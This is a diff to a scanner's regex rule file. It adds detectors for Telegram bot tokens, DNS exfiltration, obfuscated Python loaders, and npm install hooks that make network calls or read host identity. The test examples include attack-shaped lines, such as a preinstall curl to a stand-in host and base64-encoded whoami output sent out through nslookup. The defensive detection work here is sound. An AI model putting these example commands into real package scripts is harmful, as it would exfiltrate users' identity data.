@@ -21,8 +21,10 @@ name = "Telegram Bot API Token"
 severity = "critical"
 category = "exfiltration"
 description = "Telegram Bot API token — C2/exfiltration channel"
-pattern = '''(?:https?://)?api\.telegram\.org/bot\d{8,10}:[a-zA-Z0-9_-]{35,40}/'''
-matches = ['''https://api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm/sendMessage''']
+# Also a bare token in quotes: bot libraries (node-telegram-bot-api) build the URL.
+pattern = '''(?:https?://)?api\.telegram\.org/bot\d{8,10}:[a-zA-Z0-9_-]{35,40}/|["'`]\d{8,10}:AA[a-zA-Z0-9_-]{33}["'`]'''
+matches = ['''https://api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm/sendMessage''', '''const BOT_TOKEN = '1234567890:AABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh';''']  # ggignore: placeholder, not a token
+ignores = ['''version = "20240101:AA"''']
 
 [[rule]]
 id = "KS-EXF-003"
@@ -419,7 +421,7 @@ name = "URL Fetch Command"
 severity = "medium"
 category = "supply_chain"
 description = "URL fetching — possible external payload download"
-pattern = '''(?i)(?:Invoke-WebRequest|curl(?-u:\b)|wget(?-u:\b)|fetch\(|axios\.(?:get|post)|request\.get|(?-u:\b)https?\.(?:request|get)\s*\(|requests\.(?:get|post|put)\s*\(|urlopen\s*\(|urllib\.request|http\.client|XMLHttpRequest|(?-u:\b)dns\.(?:lookup|resolve\w*)\s*\(|Net\.WebClient|Download(?:String|File)\s*\()'''
+pattern = '''(?i)(?:Invoke-WebRequest|curl(?-u:\b)|wget(?-u:\b)|fetch\(|axios\.(?:get|post)|request\.get|(?-u:\b)https?\.(?:request|get)\s*\(|requests\.(?:get|post|put)\s*\(|urlopen\s*\(|urllib\.request|http\.client|XMLHttpRequest|(?-u:\b)dns\.(?:lookup|resolve\w*)\s*\(|socket\.(?:gethostbyname(?:_ex)?|getaddrinfo)\s*\(|Net\.WebClient|Download(?:String|File)\s*\()'''
 
 [[rule]]
 id = "KS-SUP-004"
@@ -583,8 +585,9 @@ name = "Host Reconnaissance"
 severity = "medium"
 category = "recon"
 description = "Collects host / user identity"
-pattern = '''(?:(?-u:\b)os\.(?:hostname|userInfo|networkInterfaces)\s*\(|getpass\.getuser\s*\(|socket\.gethostname\s*\(|platform\.node\s*\(|os\.getlogin\s*\(|psutil\.net_if_addrs)'''
-matches = ['''const u = os.userInfo().username''']
+pattern = '''(?:(?-u:\b)os\.(?:hostname|userInfo|networkInterfaces)\s*\(|getpass\.getuser\s*\(|socket\.gethostname\s*\(|platform\.node\s*\(|os\.getlogin\s*\(|psutil\.net_if_addrs|os\.uname\s*\(\s*\)\s*(?:\.nodename|\[\s*1\s*\])|(?:check_output|getoutput|popen|execSync)\s*\(\s*\[?\s*["'`](?:whoami|hostname|id)["'`])'''
+matches = ['''const u = os.userInfo().username''', '''subprocess.check_output('whoami', shell=True)''', '''user = os.popen('id').read()''', '''host = os.uname().nodename''']
+ignores = ['''machine = os.uname()[4]''', '''subprocess.check_output(['git', 'rev-parse', 'HEAD'])''']
 
 [[rule]]
 id = "KS-SUP-008"
@@ -871,3 +874,43 @@ description = "require / child_process / process.env / a URL spelled as hex pair
 pattern = '''(?i)(?:72657175697265|6368696c645f70726f63657373|70726f636573732e656e76|686f73746e616d65|68747470733a2f2f|687474703a2f2f|6178696f73|666574636828|646973636f7264|776562686f6f6b|6f732e75736572496e666f)'''
 matches = ['''g('72657175697265')''', ''''68747470733A2F2F6C6F672D7365727665722E76657263656C2E617070'''']
 ignores = ['''String.fromCharCode(parseInt('7265', 16))''']
+
+[[rule]]
+id = "KS-SUP-012"
+name = "Install Script Network Command"
+severity = "high"
+category = "npm_hook"
+description = "An npm install script runs curl, wget, nslookup or ping: the install itself talks to a host"
+pattern = '''(?i)"(?:pre|post)?install"\s*:\s*"(?:[^"\\\n]|\\.)*?(?-u:\b)(?:curl|wget|nslookup|dig|ping|ncat|nc|Invoke-WebRequest|iwr|irm)\s'''
+matches = ['''"preinstall": "curl https://request-logger.example/rce"''', '''"install": "b64=$(echo \"$(whoami)\" | base64); nslookup $b64.cb.example"''']
+ignores = ['''"postinstall": "node scripts/build.js"''', '''"test": "curl https://example.com"''']
+
+[[rule]]
+id = "KS-SUP-013"
+name = "Install Script Host Reconnaissance"
+severity = "medium"
+category = "npm_hook"
+description = "An npm install script reads the user name, host name or home directory"
+pattern = '''(?i)"(?:pre|post)?install"\s*:\s*"(?:[^"\\\n]|\\.)*?(?:\$\(\s*(?:whoami|hostname|id|uname)(?-u:\b)|`(?:whoami|hostname|id|uname)(?-u:\b)|\$\{?(?:USER|USERNAME|HOSTNAME|HOME)(?-u:\b))'''
+matches = ['''"preinstall": "b64=$(echo \"$(whoami):$(hostname)\" | base64 -w0)"''']
+ignores = ['''"postinstall": "node install.js"''']
+
+[[rule]]
+id = "KS-REC-004"
+name = "DNS Lookup of Built Hostname"
+severity = "high"
+category = "exfiltration"
+description = "Resolves a host name assembled from data: DNS exfiltration needs no HTTP"
+pattern = '''(?:gethostbyname(?:_ex)?|getaddrinfo|(?-u:\b)dns\.(?:lookup|resolve\w*))\s*\(\s*(?:f["'][^"'\n]*\{[^}\n]+\}[^"'\n]*\.[a-z]|`[^`\n]*\$\{[^}\n]+\}[^`\n]*\.[a-z]|[\w$.]+\s*\+\s*["']\.)'''
+matches = ['''socket.getaddrinfo(f"{h}.{u}.hy-api.example.com", 80)''', '''dns.lookup(`${data}.oob.example.xyz`, cb)''']
+ignores = ['''socket.getaddrinfo(host, port)''', '''dns.lookup(hostname, cb)''']
+
+[[rule]]
+id = "KS-EXE-031"
+name = "Python Import-Obfuscated Loader"
+severity = "critical"
+category = "obfuscation"
+description = "zlib / base64 / marshal reached through __import__ and decoded inline: the shape of Python obfuscators"
+pattern = '''__import__\(\s*["'](?:zlib|base64|marshal|codecs|lzma|bz2)["']\s*\)\s*\.\s*(?:decompress|b64decode|b32decode|b16decode|a85decode|b85decode|loads|decode)\s*\('''
+matches = ['''_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));''']
+ignores = ['''zlib = importlib.import_module("zlib")''']
